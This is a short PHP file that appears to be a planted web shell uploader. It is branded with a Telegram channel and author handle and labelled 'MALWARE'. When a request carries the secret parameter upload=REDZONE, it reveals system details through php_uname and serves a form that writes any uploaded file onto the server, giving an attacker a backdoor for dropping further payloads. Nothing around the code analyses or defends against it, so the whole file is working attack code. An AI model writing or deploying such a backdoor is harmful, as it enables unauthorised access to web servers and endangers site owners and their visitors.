<?php
$allowedUpload = isset($_GET['upload']) && $_GET['upload'] === 'REDZONE';if($allowedUpload) {echo '<pre>t.me/redzonecyberarmy 𝐌𝐀𝐋𝐖𝐀𝐑𝐄 Coded By @OXiZ3N'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if ($_POST) {if (@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {echo 'OK';} else {echo 'ER';}}} else {echo 'Upload not allowed.';}?>